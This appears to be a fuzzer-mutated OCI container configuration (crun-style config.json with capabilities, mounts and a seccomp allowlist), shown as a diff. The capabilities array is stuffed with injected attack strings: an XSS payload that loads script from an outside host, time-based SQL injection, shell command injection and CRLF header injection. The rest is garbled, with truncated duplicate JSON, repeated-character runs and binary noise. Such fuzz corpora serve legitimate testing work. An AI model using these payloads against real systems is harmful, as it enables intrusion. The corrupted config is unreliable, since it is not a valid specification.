@@ -1,0 +1,246 @@
+{
+    "ociVersion": "1.0.1-cev",
+    "process": {
+        "selinuxLabel": "system_u9system_r:container_t:s0:c399,c1003",
+        "terminal": false,
+        "user": {
+            "uid": 0,
+            "gid": 0
+        },
+        "args": [
+            "head", "-n10", "/dev/kmsg"
+        ],
+        "9nv": [
+            "PATH=/usr/local/sbr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+            "TERM=xterm"
+        ],
+        "cwd": "/",
+        "capabilities": {
+            "bounding": [
+ //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Ó@///////////////////////////////////////////////////////////////////////...............]..........................................................\u000b\\u0000...........................ini", "\r\nCC: getccccccccccccccccccccccccccccccccccccccccpu@mail.it\r\nLocation: www.google.it", {"param": "</script><svg/onload='+/\"/+/onmouseover=1/+(s=document.creaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaateElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/getcwd.net/).slice(2),document.documentElement.appendChild(s))//'>"}, "getdents&sleep 5i&d'\\\"`0&sleep 5&id`'", [{"getdents64": "getdents64"}], ["getegid"], ""[{"geteuid": "geteuid"}], "\\u0000\\u0000CC: geteuid32@mail.it\r\nLocation: www.google.\\u0090\\u0006", [{"getgid": "getgid"}], {"param": "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEPPPPPPP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,[1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex = getgid32"}, "", "", {"param": "||cmdddddddddddddddddddddddddddddddd.exe&&id||getitimer"}, ["getpeername"], {"param": "\\u0006\\u0000\\u0000\\u0000\\u00ceid&sleep 5&id'\\\"`0&sleep 5&id`'"}, "#{%x['getpgr'p]}+foo", {"param": "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@versjon,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(\\u00f0)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex = getpid"}, {"param": "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0DEEC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex kernelTCP"}, [{"getpriority": "getpriority"}], [{"getrandom": "getrandom"}], ["getresgid"], {"param": "data:text/html,https://getresggggggggggggggggggid-6442450944O:a.it@www.\\it"}, false, "", "", ["getrusage"], "", "", "#{%x['getsockpt'}]+f\"oo", {"param": "gettid&sleep 5&id'\\\"`0&sleep5&id`'"}, "", "", "SELECT 1,2,IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|\"XOR(IF(SUBSTR()<5"oc,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR\"*/ FROM some_table WHERE ex = getuid32", {"param": "||cmd.2xe&&id||getxa\\u00d0\\u0001r"}, ["inotify_add_watch"], "</script><svg/onload='+/\"/+/onmoseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/inotify_init.net/).slice(2),document.documentElement.appendChild(s))//'>", ["inotify_init1"], 0, ["io_cancel"], "|||||||||||||||||||cmd.exe&&id||io_dest//////////////////////////////////////////////////////t¸///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////ITE",
+                "CAP_KILL",
+                "CAP_NET_BIND_SERVICE"
+            ],
+            "permitted": [
+        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////Version":"1.0.2-dev","pcess":{"user":{"uid":0,"gid":1,"additionalGids":[0,1,2,3,4,6,10,11,20,26,27]},"args":["/bin/sh","-c","echo hello"],"env":["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","HOSTNAME=3207b88579a1"],"cwd":"/","capabilities":{"bounding":["CAP_AUDIT_WRITE","CAP_CHOWN","CAP_DAC_OVERRIDE","CAP_FOWNER","CAP_FSETID","CAP_KILL","CAP_MKNOD","CAP_NET_BIND_SERVICE","CAP_NET_RAW","CAP_SETFCAP","CAP_SETGID","CAP_SETPCAP","CAP_SETUID","CAP_SYS_CHROOT"],"effective":["CAP________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________ID","CAP_KILL","CAP_MKNOD","CAP_NET_BIND_SERVICE","CAP_NET_RAW","CAP_SETFCAP","CAP_SETIT_WRITE",
+		"CAP_KILL",
+		"CAP_NET_BIND_SERVICE"
+	    ],
+	    "permitted": [
+		"CAP_AUDIT_WRITE",
+				"CAP_NET_BINMWXRYQD_SERVICE"
+	    ],
+	    "ambient": [
+		"CAP_AUDIT_WRITE",
+		"CAP_KILL",
+		"CAP_NET_BIND_SERVICE"
+	    ]
+	},
+	"noNewPrivileges": true
+    },
+    "root": {
+	"path": "rootfs",
+	"readonly": true
+    },
+    "hostname": "crun",
+    "mounts": [
+	{
+	    "destination": "/proc",
+	    "type": "proc",
+	    "source": "proc"
+	},
+	{
+	    "destination": "/dev",
+	    "type": "tmpfs",
+	    "source": "tmpfs",
+	    "options": [
+		"nosuid",
+		"strictatime",
+		"mode=755",
+		"size=65536k"
+	    ]
+	},
+	{
+	    "destination": "/dev/pts",
+	    "type": "devpts",
+	    "source": "devpts",
+	    "options": [
+		"nosuid",
+		"noexec",
+		"newinstance",
+		"ptmxmode=0666",
+		"mode=0620"
+	    ]
+	},
+	{
+	    "destination": "/dev/shm",
+	    "type": "tmpfs",
+	    "source": "shm",
+	    "options": [
+		"nosuid",
+		"noexec",
+		"nodev",
+		"mode=1923",
+		"size=65536k"
+	    ]
+	},
+	{
+	    "destination": "/sys",
+	    "type": "sysfs",
+	    "source": "sysfs",
+	    "options": [
+		"nosuid",
+		"noexec",
+		"nodev",
+		"ro"
+	    ]
+	},
+	{
+	    "destination": "/sys/fs/cgroup",
+	    "type": "cgroup",
+	    "source": "cgroup",
+	    "options": [
+		"none",
+                "name=systemd",
+		"noexec",
+		"nodev",
+		"relatime",
+		"ro"
+	    ]
+	},
+	{
+	    "destination": "/dev/mqueue",
+	    "type": "mqueue",
+	    "source": "mqueue",
+	    "options": [
+		"nosuid",
+		"noexec",
+		"nodev"
+	    ]
+	}
+    ],
+    "linux": {
+        "cgroupsPath": "/system.slice/run-rebf0d897cab84580a8241402c74069b2.scope/container",
+	"namespaces": [
+	    {
+		"type": "pid"
+	    },
+	    {
+		"type": "network"
+	    },
+	    {
+		"type": "ipc"
+	    },
+	    {
+		"type": "uts"
+	    },
+	    {
+		"type": "mount"
+	    }
+	],
+
+        "seccomp": {
+            "defaultErrnoRet": 38,
+            "defaultAction": "SCMP_ACT_ERRNO",
+            "architectures": [
+                "SCMP_ARCH_XRQUXV",
+                "SCMP_ARCH_X86",
+                "SCMP_ARCP_ARCH_X32"
+            ],
+            "syscalls": [
+                {
+                    "names": [
+                        "accept",
+                        "accept4",
+                        "access",
+                        "adjtimex",
+                        "alarm",
+                        "bind",
+                        "brk",
+                        "capget",
+                        "capset",
+                        "chdir",
+                        "chmod",
+                        "chown",
+                        "chown32",
+                        "clock_getres",
+                        "clock_gettime",
+                        "clock_nanosleep",
+                        "close",
+                        "connect",
+                        "copy_file_range",
+                        "creat",
+                        "dup",
+                        "dup2",
+                        "dup3",
+                        "epoll_create",
+                        "epoll_create1",
+                        "epoll_ctl",
+                        "epoll_ctl_old",
+                        "epoll_pwait",
+                        "epoll_wait",
+                        "epoll_wait_old",
+                        "eventfd",
+                        "eventfd2",
+                        "execve",
+                        "execveat",
+                        "exit",
+                        "exit_group",
+                        "faccessat",
+                        "fadvise64",
+                        "fadvise64_64",
+                        "fallocate",
+                        "fanotify_mark",
+                        "fchdir",
+                        "fchmod",
+                        "fcdir","mkdirat","mknod","mknodat","mlock","mlock2","mlockall","mmap","mmap2","mount","mprotect","mq_setattr","mq_notify","mq_open","mq_timedreceive","mq_timedsend","mq_unlink","mremap","msgctl","msgget","msgrcv","msgsnd","msync","munlock","munlockall","munmap","name_to_handle_at","nanosleep","newfstatat","open","openat","openat2","pause","pipe","pipe2","pivot_root","poll","ppoll","prctl","pread64","preadv","preadv2","prlimit64","pselect6","pwrite64","pwritev","pwrited","readahead","readlink","readlinkat","readv","reboot","recv","recvfrom","recvmmsg","recvmsg","remap_file_pages","removexattr","rename","renameat","renameat2","restart_syscall","rmdir","rt_sigaction","rt_sigpending","rt_sigprocmask","rt_sigqueueinfo","rt_sigreturn","rt_sigsuspend","rt_sigtimedwait","rt_tgsigqueueinfo","sched_get_priority_max","sched_get_priority_min","sched_getaffinity","sched_getattr","sched_getparam","sched_getscheduler","sched_rr_get_interval","sched_setaffinity","sched_setattr","sched_setparam","sched_setscheduler","sched_yield","seccomp","select","semctl","semget","semop","semtimedop","send","sendfile","sendfile64","sendmmsg","sendmsg","sendto","set_robust_list","set_thread_area","set_tid_address","setfsgid","setfsgid32","setfsuid","setfsuid32","setgid","setgid32","setgroups","setgroups32","setitimer","setpgid","setpriority","setregid","setregid02","setresgid","setresgid32","setresuid","setresuid32","setreuid","setreuid32","setrlimit","setsid","setsockopt","setuid","setuid32","setxattr","shmat","shmctl","shmdt","shmget","shutdown","sigaltstack","signalfd","signalfd4","sigreturn","socket","socketcall","socketpair","splice","stat","stat64","statfs","statfs64","statx","symlink","symlinkat","sync","sync_file_range","syncfs","sysinfo","syslog","tee","tgkill","time","timer_create","timer_delete","timer_getoverrun","timer_gettime","timer_settime","timerfd_create","timerfd_gettime","timerfd_settime","times","tkill","truncate","truncate64","ugetrlimit","umask","umount","umount2","uname","unlink","unlinkat","unshare","utime","utimensat","utimes","vfork","vmsplice","wait4","waitid","waitpid","write","writev"],"action":"SCMP_ACT_ALLOW"},{"names":["personality"],"action":"SCMP_ACT_ALLOW","args":[{"indexalue":0,"op":"SCMP_CMP_EQ"}]},{"names":["personality"],"action":"SCMP_ACT_ALLOW","args":[{"index":0,"value":8,"op":"SCMP_CMP_EQ"}]},{"names":["personality"],"action":"SCMP_ACT_ALKOW","args":[{"index":0,"value":131072,"op":"SCMP_CMP_EQ"}]},{"names":["personality"],"action":"SCMP_ACT_ALLOW","args":[{"index":0,"value":131080,"op":"SCMP_CMP_EQ"}]},{"names":["personality"],"action":"SCMP_ACT_ALL","args":[{"index":0,"value":4294967295,"op":"SCMP_CMP_EQ"}]},{"names":["arch_prctl"],"action":"SCMP_ACT_ALLOW"},{"names":["modify_ldt"],"action":"SCMP_ACT_ALLOW"},{"names":["clone"],"action":"SCMP_ACT_ALLOW","args":[{"index":0,"value":2080505856,"op":"SCMP_CMP_MASKED_EQ"}]},{"names":["chroot"],"action":"SCMP_ACT_ALLOW"},{"names":["socket"],"action":"SCMP_ACT_ALLOW"}]},"maskedPaths":["/proc/acpi","/proc/kcore","/proc/keys","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/proc/scsi","/sys/firmware","/sys/fs/selinux","/sys/dev"],"readonlyPaths":["/proc/asound","/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"],"mountLabel":"system_u:object_r:container_file_t:s0:c296,c613"}}
+                                                                                                                              ¥'Ô%†ĞLé-cÊiËK¥Š53ÍJiªJgu Q¿”a†ÏèC¹º¶<99­Íæ#,	úÏ$¡CÚoãû¨ÈŸQğ/]Ô`>&"E’Q	Ù°³°;¯Lóú^~¬‡…J™J·à3Šn£HåÑ­İÁ¤kÅ_c»^‘
+E-—p©zÄ×!Ï‡	’uø½,: EZ'<Öåæbb@Ü²Z»íÔÑÉÂ«c¹W¢0[ÔÌË­·\s¦Ô20€Á€½;Æhkº»,>b-%±G	ğšÃ‚5’ía(ÏS;ëµÁvdÂŠ[›—} b©YÚÂØb9T@NÆ31˜%¢¥;%'Äì|‹<Xäªßıòç×²9'À>m…WQRoe'™§ì/1uIiJqÓQ£˜¬9?íMB+kÄâ]i½û&ô—ğ^¬úwa¯¶H²ì•¼œÉIl)…Í‡¦C¿
+¥ÿùœ`	1²®<f%Êškm'¿RÕâƒªâú_)ä9øáĞAUU,Ñ2šq—´~zÀ‚˜wà°P˜u¨ î–"YôvXm3f[´ÀnúËˆëƒ>^%+$.§2¸:ÒŸ´#¯=ìöR°±(^¹[¥…ô8b³ŒÈ9yw×·3¾VLÁ5u½E9ä@l¯ØÂ…N9•Y€"ãEbúËä<ßAÎsƒøÔJ½İC-l™	ê°v®N;ÅÿVŞë¯ÿ]mqtq¡Œp)5<ÇÈpGÓÃÈ×óT\¢h$,D‹µhÃ³‡¸nš©ï‚%ÌXã¡‡…ˆ ZÆŞşK“Q·$ñ­*¯~mÂ]ùR¯O                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Version":"1.0.2-dev","process":{"user":{"uid":0,"gid":1,"additionalGids":[0,1,2,3,4,6,10,11,20,26,27]},"args":["/bin/s                                                                                                                                                                                                                                                                                                                €                                                                                                                                                                                                                                                                                                                                                                                                                                                                    ","l                                                                                                                                                                                                                                                                                                                                                                                       ¶»äÊ§Ì`?'•š¦ùƒE”wxçZjÑı/UúO’IşSÉÖËãm);zààÅcqNq'b]˜ı4î½ë€½…aæÚ¡qBAéŸÉMG`»ÛV!½Áº¨P_ÅÂÿ›¾=—=^:qÕm
+oı„ã‰r‰YC2¸_z#>røÕO~Rõ>¬Ü@`§&Î'øWÄCehõ R,=›•                                                                                                                                                                                                                                                                                                                                                                                                                                                              ôÜ€&î­ïEk?¢{J£	ûÿîó4<8ˆÎÒöY*I—¡óÊä?ªÛä<ŸÄ}‡ËÈø£Âû€äT
+MÏ]£9Š"SoÔÎ1¨lî22şÓßğİiÙÖ¨XY™¨Ú„”¢dÈDØ| gêë%	F›ysssssssssssssss¦@fnİÙœ‡c–XQÏ†ê˜Q\q”TlÒ"…V¢lİîWõ+ì]áL2ãoø5Hqgkó)n-Y&áÌ\mÃÿêİiX©+9ıS¹í}“nµ[†ô¾Û[(%Fâ¯i­8:éñ£¡TÊ 'E'P T$cªN€æc°çÕ8B%Añ¹ˆG¯¹2Ém3Õ¨è$bµÃ‡Ùh¬Ïíó&j^‰ÂEj¨Ë¢Y«=,rcÇùv7—:Ğ±IÑL|J3.D£,9ñ-X]Ói=äõÿƒ4ùÍ»s›¦aØH®,3{­6¦‹š7!Mû­‚™‘Ÿ5+A÷±è„€]fÍ'o’6(
+upû˜): Ïã‘èo-©éTºˆ­Åà¦]¦Bí%>º`cyã'M0¾õ€v×CÄ´‹Q|Ğo\ÙVÀ0z·ˆ\õä^ıÚ*Eßúïk
+]ïÌt×;†à%Şh…@è»…àË<î,Ì%CsÂ(Âqø&æ1>*¤ãÅÁº¯.˜- JÜ·å^±Â›%IMN‘ËzÍV'®‹:H0g×ş=b*e®jg­xŒ²İTPd}töpöÙ+×æÂVJÈ†™‚;ÂûÒÛ¦ÿ}æMÔn0ëça¯f-/Û$.‹3é»¥Îc¢@b¯ÏüO”«Í{Q÷vƒDË\ß£äö”¾ì«æP'¬ˆş8^Y'*ĞÑÄ¯·RÆÿhñRuBÏõ„Ï1MÚdJT ¨H[cõ¨qŠT²Ä‹5òªx—³ˆ•á˜©îUï,êHO¬¼Ûà¾Æ|Aƒnşâ•,õTµÀS8»2şªüÈF÷×¼Ä¦Œ%-÷õëv™:êGL¯òğ¤H¬{EŠ!ëîTO‘GveÇ·!<ùÛ
+ˆAO}ş£¾ '¶CT}å‡†kÖª5è¼ú³‚—·ÁìQ¹lE“X¬Œw-F‡f#Gœö}-a¾ı„=snÔ,UÚ÷ZGT-Ô]ï™å0÷ñÔ+g¯x¯b¾ÑıJ;
+”"2%ïŠ•ÙEÌHöZ!À¯ÿ%™µ´ã W¶%šïa…Hñ]Ô¸]NZ–ì0„ü(ê¡vWÄ~gÄFv–'8è%!b1‰S!yG”Lí,wÈ¡‚v†Ø®(a‡¦óŸ@ ğÖ~Q_¸(e¥~\GáÇîîr3ÙsÒİÏc/õ%#ÿş½d¯í…¹Ó,9{ÒöÊ©n{‚“”Äª‹C—[sBÔ^•Qnmv{^y– ¿s	p7ÂQ…İô,œª”oÂ®ß¹Áº¨v¡ÙÆIój_a€¶ncŸÍ¹ÔŒ÷ü]—Åsæn¶‚Œ…%u’¡~ÜNK„íLaF8*!Gv¼¾->’€H˜?ÖšÉ—×´‹9ù]!•İDğX'¢J'GrxÄYÇ7Ã]ç³ ‡/%!Â½?z“$/†9KH«pïŸ/¬¤ÈƒÔ‚•ùkÏÂIíàĞocùšèD©Ú´ñ_¢úÎø“»@J[ª¾¾¶ßÁ¿µ…7'*¼ÉÙ9AP$~O—šÆÆÚ	è5(ƒëŒ&'áBZS÷Xkîè ª/9iDóAĞür‘Lmv–EË{-`.Í¡şR-¾hÆJKÍc»“©#3<ÓƒbLôÌèÍÎ-pãÊg³.ÈÌÚ*ÉO#—ãÏ$ÏnLƒP†G 
+Ë*rrŞÉÓ¼ÉŸ‹ĞßŸ°´4ÀFùíQ!QbÜó{İ«m„…+©–•½sO=³´ÛšíCŞÖ@NÅŠW8¸°+ıÑÒ‚òc;%t˜©JrÓºÃÖìQ%,¢ŸÿÏºĞt„U&V(|‰ÉÎÅôÇ±'}P€ùx—ãŸp‘a£éÚfÛŞ½(}¢÷Şô¦1\÷|-+E-cô(-Ë‹…ú&+ˆè¹‹Û¦0’~Ob¸‹údŠgó7Fî‡cëä3‡­)’RºIïÿí‘]Ä	uD{Ìjká"(2ããf’Lâ”Ï«mlú5o_f˜¶BâÿÑ´³S~xw/wÌ0måéUñNo*g<Û³f~%CT}Œ‹28)şˆ~¯ ^û£4$n}Êxûoc<øƒï‰öìîÃ­«ó ù24úuô¾IëÉAš À@³ÏÅ¥´{D#	+ŞœÛ¢::ú
+Ì=\Á±9ÎYƒ7vülA¼ĞÇÓ}5xUÉxt^µ°jötÇa”!³¨ÔñÊ®jå@(„ŒPÛéÚÂgİ­GrÔëm¸¯a®&	ÄUÊÄ×ò	G|ÀÃŸ+/ˆ4âÈíôl|WøèD”ŒÇÆğ-ÊQs_cÓ=ç¸y†•/T‹–2lå#7PÚ3òñV¦ÇØ¾Rt~áÙIN“qÕK(òØ„‡;4£æ­hàó*«lÔ>¨Ó¾-\ÌÒÖkf'yB	‰Ç3â{:¬<C¨Ã;wYwO™ËÒÏÁ‹'Ç‘ß)‡¨j«ƒÑyÄİu
+tò¸;ªš†§¯æ¿Íª6‹ÜXWr¯vÈTÖ(ÓFçÌS¨Aì`»Ì‹	x§GŸæT|ºIÂ¹zb‚Ò2œµ•ë\b\3TÄvFÙ‹^,«ÉY¨a}>õãq´ :|#,åHïæ„"5)ÎX¿"ßEYá	ğS\ı*hÆQÂÎ‚Ñ¹ú xR¨ à/¶%OÄvDL—
+H\Sâ;‡ÿ¢şc_e]íüf@ÏÚòŞÆ¯‹·ÜàğÎÏ<^„òGN.o¿GÑ$@ğ³’­õÊÚ3ğóü¥ãÈGL¡Ív±3R\“«
+C†D¶yŠ¨sæuWğŸ‚ik£Rt”ı¥İ
+y	IWQæˆ[?fzŞÈZ–Ú<¼¿>‹#Œ‰ÛÄrŠêæì—úŠ—9ÀRQ/~oCoª'{h[                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              ÿ                                                                                                                                                                                                                                                                                                                                                            68756241                                                                                                          m                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 ôÜ€&î­ïEk?¢{J£	ûÿîó4<8ˆÎÒöY*I—¡óÊä?ªÛä<ŸÄ}‡ËÈø£Âû€äT
+ÿè*BñYƒ"UMÏ]£9Š"SoÔÎ1¨lî22şÓßğİiÙÖ¨XY™¨Ú„”¢dÈDØ| gêë%	F›ys¦@fnİÙœ‡c–XQÏ†ê˜Q\q”TlÒ"…V¢lİîWõ+ì]áL2ãoø5Hqgkó)n-Y&áÌ\mÃÿêİiX©+9ıS¹í}“nµ[†ô¾Û[(%Fâ¯i­8:éñ£¡TÊ 'E'P T$cªN€æc°çÕ8B%Añ¹ˆG¯¹2Ém3Õ¨è$bµÃ‡Ùh¬Ïíó&j^‰ÂEj¨Ë¢Y«=,rcÇùv7—:Ğ±IÑL|J3.D£,9ñ-X]Ói=äõÿƒ4ùÍ»s›¦aØH®,3{­6¦‹š7!Mû­‚™‘Ÿ5+A÷±è„€]fÍ'o’6(
+upû˜): Ïã‘èo-©éTºˆ­Åà¦]¦Bí%>º`cyã'M0¾õ€v×CÄ´‹Q|Ğo\ÙVÀ0z·ˆ\õä^ıÚ*Eßúïk
+]ïÌt×;†à%Şh…@è»…àË<î,Ì%CsÂ(Âqø&æ1>*[ãÅÁº¯.˜- JÜ·å^±Â›%IMN‘ËzÍV'®‹:H0g×ş=b*e®jg­xŒ²İTPd}töpöÙ+×æÂVJÈ†™‚;ÂûÒÛ¦ÿ}æMÔn0ëça¯f-/Û$.‹3é»¥Îc¢@b¯ÏüO”«Í{Q÷vƒDË\ß£äö”¾ì«æP'ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss€#ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss       
+sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssSssssssssssssssssssssssssssss      ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssˆÅü‘(JSÌp™Ä†C…\²hìhéÕ6‹7‰sæYõºîÅì=¬Õñ·JÓøº(7OpâĞ‚³u×¤™œXõğa|„öô_	£‘#
+=ÏöÖı½oãˆà6J'û'ŒÕ·O,¯Óğ¯ú|ø©–Ç°ë,È	®wãjú¤ 9üÃˆ©¶³ñ±qÓO•Å*;Ã¦İŠ|ıg4E`öİü’G£;¨¼sa™¼…âÆ(ã‚G[YD€ÿºƒmÊ‘k{[IÀßnãVs§­X $)I47SE4Ø¥qnp=ç;óæ€yãz«¾qBW+åŠ7h;ßè¨ò×Zh•€)Ğä»åÂÑ¡¿N/Ö[ˆ	œ;kÓÎ¸Ò²Ù°9Ó)Í¸¹®"|…‹3mÔcù¶ÅÙ¦ôü(Sä¤L«Ey¼…9“ ìÅ7š
+Ï|üÉJÖvv1b=…q…Àÿ/xÕO>u5[¹z’XæNí\¢±h‹ï¥ ‡@Z¦¡¹Ÿ†–ÄkÊô€i‰e“Ğ6o­*—Ô‚Ğ¦ÂfìMó¿S™ğq/!ğsüqƒÁN—jÆJo>J°JTØTÀkLRë|—N—PëàúïJ²nt8,c¤ÊjBÕsAVÔ“W™Kaìââï¶pªŠ÷İ‰š—Š_Op$’²«‘Ôáµ.c„ğÔ–'
+*ÍÂ¤Çá>kµ•º@ü• ·w¥w|ı>cÅ&e.ú[ nÍD<¥YôAöÄÉva€å‘
+‹üïj…\(+ñ±®‹‰°K9E£oÁïÖY¥Ş#BÆm®Ñ÷h©ûÔ`štÀx\˜’m
+*->Ñ„»['JU@'âŒç”`†‰™¥ÏjfIAÿšÂÂDúãwOÃàVZ½U/G,Şóãähâ±ÿÀÂ:tú¢`£º`Qô§«eÎÈ²®®',gÁNv=p×İØêøßáx„.æc&ü!q`vÓ-¿‹Óø$ lCs~8?$Mş#µâ¡+A
+›$uääÛœ;JmŸ µÑks)‚Moæ¢€ÍÚ‡Äì/«jÂâfcYœ=ªëô_4ô¤nMf%o*ÇĞO^¾¢ĞÖ`“UÂ<4F§ŠS!w¨ªÏÚ8-¹œªüìˆ¿ÆÉää<,JäpN¶îL°Ñ Îøºæñyğ·Ë¡ ã€½úÿnzñ5PyFTNª¨JRº“ªto:KG»ë¢P`ş^IÌíÆÄê¼¸Í³E~È0{@ŠŠä |eîĞ\%ş}Z<#âVïµF@O2X¶7èl¬â˜!ÉŸµñŸá‚¹Íîı>¥ÒJÂ[¸fã£èùşmş¢ãÚØ¤ãbudE“ ,Rw…ÒE„0y&%oÄy×D²>¾¼išòÇNoJş—®âÔ±¥ 6j–ªqÃÕæHb|ğ•6´ˆ%<FÌéöh–l(i²[jõ·Ë+#İÄ¨Ïğv¯%ƒvÙüÑ›ßL­ÚRëX€W&´\4H
+H ¡j‘‰a0ƒÀ³M¬Eî:õÈr`Ù—¨á¾ÊeÀÔ-~‚†õ-S<–åÀt×*%b+eµxdL7ş›k^f@ğáÿ|Zş!†¸$EXXİe‰üu»¼Òóœ´ß÷˜Ü:P8¹†³ô›‰bŸ°éÊËzf§Ö1‹¾›ÁâæpyïJŸ@CZÛí»n³È Àä†Õ¤Rí\Ée  ‡%‚ô~%MQd[›U3ïàğu×]G	€07°´?ñ³”Kı}§¥Ô•i
+“âˆÕ,À¡³»<3—:£H÷÷±
+C_+6È—qlíĞï©hu—×İ …X/Š¦6»öi&„?–ûáÎIï€:§ºOí˜ÊJLSBhäåÉÙWaƒ¦A6*½³Ì(Qó÷I²k*ùÆŸ®€Jh{kcÃæì4Jwæ7ßËs?B©G¿—İIğJ0cMŠ“ZøàUş¹ ÂuÍ¿H{¹óZåF¹’7Õ¹øW#…zî—“ğ"o!¼3¶P¢N)lÃõ1¼§İP­ƒ±{¾ëç†­ÑÃÔQG.İÕ§˜"çAïèypáÁNâ€ÂüJFØô½«&ö[¨"¼“yŠóá†›Íl~¨á,~»>‚6kåp!åùêì­«œ¹Âòíß/Ü‚W<ÇöU€şÇÙi'÷îââuÌVà[Å·	Àd1ÇwıÉ¾ôÃAŠƒ’TÙ*OÖ˜&2¿)ƒTS6(ßjuèŞW¦şÙÿğ ÷Š õÓJC\ûrÇTKğ'Ìô¤kÑÃ)‡ŠĞ«7_ôÌ±È'‰,´*¥4fÃœyGÒ‡ëÂæ2S‡µà­'Eëš# zÔZ¯öõèÏYš‚HPæ9jÅ*ÁÜwÓ_Ÿ6f‹8ıÛÃ_pDB²Š¯8ZÔ`b›€»ƒÆùõU·¨àUTIÂ|WºÑ?ÊúÈIoÚƒßy¼5¾@H¹}ê8j!²3Ş’ü³ïuhŸ…{Ğ£GÓÔØgæ š`­õiŒÑ–Õè<ïD?‹²4²´Ğ Z—Xœ%?#rJ[è`hû	ŠeXßºî¦?r•<Ùî—Ñó’{gÖø"ÒâpÓkğêaF©-o0)Ï}ü\tìû´…wkpÂ,˜!z©F¸Ÿ´{Ã‘ıÍ´*·fœ‚Kÿ9O½_Î‰â$
